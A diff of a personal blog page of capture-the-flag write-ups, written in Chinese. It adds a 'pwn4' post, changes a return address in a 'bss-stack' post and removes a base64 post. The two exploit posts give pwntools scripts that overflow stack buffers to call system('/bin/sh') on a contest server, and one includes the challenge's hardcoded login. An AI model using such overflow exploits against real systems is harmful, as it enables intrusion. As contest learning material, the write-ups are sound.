@@ -192,6 +192,67 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-十一欢乐赛-pwn4" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2018/10/03/十一欢乐赛-pwn4/" class="article-date">
+      <time datetime="2018-10-03T09:19:05.000Z" itemprop="datePublished">2018-10-03</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/10/03/十一欢乐赛-pwn4/">十一欢乐赛-pwn4</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>有system函数 无/bin/sh字符串</p>
+<p>首先要求输入账号密码，查找字符串，账号为admin，密码为T6OBSh2i,<br>之后进入menu函数，choice的输入有栈溢出，可以被利用，选择1之后可以对cmd字符串修改，给system提供参数/bin/sh。</p>
+<p>因此大致就是首先输入账号密码，然后选择1，修改完system参数后返回menu函数，然后利用输入把menu的返回值覆盖为system函数的地址，最后选择3，退出menu函数，进入system函数，执行/bin/sh。</p>
+<p>脚本如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh=remote(&quot;47.100.40.190&quot;,10009)</span><br><span class="line">sh.recvuntil(&apos;username: &apos;)</span><br><span class="line">sh.sendline(&apos;admin&apos;)</span><br><span class="line">sh.recvuntil(&apos;password: &apos;)</span><br><span class="line">sh.sendline(&apos;T6OBSh2i&apos;)</span><br><span class="line">sh.recvuntil(&apos;Your choice: &apos;)</span><br><span class="line">sh.sendline(&apos;1&apos;)</span><br><span class="line">sh.recvuntil(&apos;Command: &apos;)</span><br><span class="line">sh.sendline(&apos;/bin/sh&apos;)</span><br><span class="line">sh.recvuntil(&apos;Your choice: &apos;)</span><br><span class="line">payload=&apos;a&apos;*0x50+&apos;a&apos;*8+p64(0x40084a)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(&apos;Your choice: &apos;)</span><br><span class="line">sh.sendline(&apos;3&apos;)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<p>随后cat flag即可得到flag</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
     <article id="post-十一欢乐赛-bss-stack" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -226,7 +287,7 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">char s; // [esp+11h] [ebp-17h]</span><br><span class="line"></span><br><span class="line">printf(&quot;Enter password: &quot;);</span><br><span class="line">fflush(stdout);</span><br><span class="line">fgets(&amp;s, 100, stdin);</span><br><span class="line">puts(&quot;Authentification failed&quot;);</span><br><span class="line">fflush(stdout);</span><br><span class="line">return sleep(1u);</span><br></pre></td></tr></table></figure>
 <p>fgets可以读入100个字符，s大小为0x17,所以输入超过0x17+4的话就可以覆盖返回地址。</p>
 <p>这题是有system函数调用的，只是没有/bin/sh字符串，所以只需要找到system地址，再在username地址写入/bin/sh就行了，另外call system的时候会push一个返回地址，再往后才是参数command，因此要留出4个字节的offset脚本如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh=remote(&quot;47.100.40.190&quot;,10011)</span><br><span class="line">sh.recvuntil(&apos;User name : &apos;)</span><br><span class="line">sh.sendline(&apos;/bin/sh&apos;)</span><br><span class="line">sh.recvuntil(&apos;Action: &apos;)</span><br><span class="line">sh.sendline(&apos;1&apos;)</span><br><span class="line">sh.recvuntil(&apos;Enter password: &apos;)</span><br><span class="line">payload=&apos;a&apos;*0x17+&apos;a&apos;*4+p32(0x08048813)+&apos;a&apos;*4+p32(0x08049dc8)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh=remote(&quot;47.100.40.190&quot;,10011)</span><br><span class="line">sh.recvuntil(&apos;User name : &apos;)</span><br><span class="line">sh.sendline(&apos;/bin/sh&apos;)</span><br><span class="line">sh.recvuntil(&apos;Action: &apos;)</span><br><span class="line">sh.sendline(&apos;1&apos;)</span><br><span class="line">sh.recvuntil(&apos;Enter password: &apos;)</span><br><span class="line">payload=&apos;a&apos;*0x17+&apos;a&apos;*4+p32(0x08048500)+&apos;a&apos;*4+p32(0x08049dc8)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
 <p>之后cat flag就可以得到flag了</p>
 
       
@@ -756,66 +817,6 @@
 <p>将输入与0x804a040处的值经过一系列运算后比较<br>若不相等则gg，直接写脚本：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">final=[0x8F,0x0AA,0x85,0x0A0,0x48,0x0AC,0x40,0x95,0x0B6,0x16,0x0BE,0x40,0x0B4,0x16,0x97,0x0B1,0x0BE,0x0BC,0x16,0x0B1,0x0BC,0x16,0x9D,0x95,0x0BC,0x41,0x16,0x36,0x42,0x95,0x95,0x16,0x40,0x0B1,0x0BE,0x0B2,0x16,0x36,0x42,0x3D,0x3D,0x49]</span><br><span class="line">flag=final</span><br><span class="line">for i in range(len(final)):</span><br><span class="line">	flag[i]=((final[i]&amp;0xaa)&gt;&gt;1|2*(final[i]&amp;0x55) )-9</span><br><span class="line">out=&apos;&apos;.join([chr(i) for i in flag])</span><br><span class="line">print out</span><br></pre></td></tr></table></figure>
 <p><strong><em>flag get</em></strong></p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-base64" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2018/09/22/base64/" class="article-date">
-      <time datetime="2018-09-22T06:58:58.000Z" itemprop="datePublished">2018-09-22</time>
-</a>
-
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/09/22/base64/">base64</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <p>百度了一会base64，在吾爱破解上发现了一篇<a href="https://www.52pojie.cn/thread-793420-1-1.html" target="_blank" rel="noopener">讲解很详细的文章</a>，于是尝试自己实现base64加密</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">letters=[&apos;A&apos;, &apos;B&apos;, &apos;C&apos;, &apos;D&apos;,&apos;E&apos;,&apos;F&apos;,&apos;G&apos;,&apos;H&apos;,&apos;I&apos;,&apos;J&apos;,&apos;K&apos;,&apos;L&apos;,&apos;M&apos;,&apos;N&apos;,&apos;O&apos;,&apos;P&apos;,&apos;Q&apos;,&apos;R&apos;,&apos;S&apos;,&apos;T&apos;,&apos;U&apos;,&apos;V&apos;,&apos;W&apos;,&apos;X&apos;,&apos;Y&apos;,&apos;Z&apos;,&apos;a&apos;, &apos;b&apos;, &apos;c&apos;, &apos;d&apos;,&apos;e&apos;,&apos;f&apos;,&apos;g&apos;,&apos;h&apos;,&apos;i&apos;,&apos;j&apos;,&apos;k&apos;,&apos;l&apos;,&apos;m&apos;,&apos;n&apos;,&apos;o&apos;,&apos;p&apos;,&apos;q&apos;,&apos;r&apos;,&apos;s&apos;,&apos;t&apos;,&apos;u&apos;,&apos;v&apos;,&apos;w&apos;,&apos;x&apos;,&apos;y&apos;,&apos;z&apos;,&apos;0&apos;, &apos;1&apos;, &apos;2&apos;, &apos;3&apos;,&apos;4&apos;,&apos;5&apos;,&apos;6&apos;,&apos;7&apos;,&apos;8&apos;,&apos;9&apos;,&apos;+&apos;, &apos;/&apos;]</span><br><span class="line">def encode(str_input):</span><br><span class="line">	str_output=&apos;&apos;</span><br><span class="line">	list_input=[&apos;&#123;:0&gt;8&#125;&apos;.format(str(bin(ord(str_input[i]))).replace(&apos;0b&apos;, &apos;&apos;)) for i in range(len(str_input))]</span><br><span class="line">	compensate=0</span><br><span class="line">	while list_input:</span><br><span class="line">		list_temp=list_input[:3]</span><br><span class="line">		while len(list_temp)%3:</span><br><span class="line">			compensate+=1</span><br><span class="line">			list_temp.append(&apos;0&apos;*8)</span><br><span class="line">		str_temp=&apos;&apos;.join(list_temp)</span><br><span class="line">		list_str_temp=[str_temp[i:i+6] for i in [0,6,12,18]]</span><br><span class="line">		list_str_temp=[int(i,2) for i in list_str_temp]</span><br><span class="line">		str_output+=&apos;&apos;.join(letters[i] for i in list_str_temp)</span><br><span class="line">		list_input=list_input[3:]</span><br><span class="line">	str_output+=&apos;=&apos;*compensate</span><br><span class="line">	return str_output</span><br><span class="line">def decode(str_input):</span><br><span class="line">	str_output=&apos;&apos;</span><br><span class="line">	list_input=[&apos;&#123;:0&gt;6&#125;&apos;.format(str(bin(letters.index(i))).replace(&apos;0b&apos;, &apos;&apos;))for i in str_input if i != &apos;=&apos;]</span><br><span class="line">	compensate=0</span><br><span class="line">	for i in str_input:</span><br><span class="line">		if i == &apos;=&apos;:</span><br><span class="line">			compensate+=1</span><br><span class="line">	while list_input:</span><br><span class="line">		list_temp=list_input[:4]</span><br><span class="line">		str_temp=&apos;&apos;.join(list_temp)</span><br><span class="line">		while len(str_temp)%8:</span><br><span class="line">			str_temp=str_temp[0:-1*2*compensate]</span><br><span class="line">		list_str_temp=[str_temp[i:i+8] for i in [0,8,16]]</span><br><span class="line">		list_str_temp=[int(i,2) for i in list_str_temp]</span><br><span class="line">		str_output+=&apos;&apos;.join([chr(i)for i in list_str_temp])</span><br><span class="line">		list_input=list_input[4:]</span><br><span class="line">	return str_output</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s=&quot;sadadsadaddasdadas&quot;</span><br><span class="line">d=&apos;c2FkYWRzYWRhZGRhc2RhZGFz&apos;</span><br><span class="line">print encode(s)</span><br><span class="line">print decode(d)</span><br></pre></td></tr></table></figure>
-<p>运行：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sH1rkEr:desktop macbook$ python base64.py</span><br><span class="line">c2FkYWRzYWRhZGRhc2RhZGFz</span><br><span class="line">sadadsadaddasdadas</span><br></pre></td></tr></table></figure>
-<p>终于是成功了，编写过程中由于字符串和list的问题总是出错，还是要多看看python</p>
 
       
     </div>
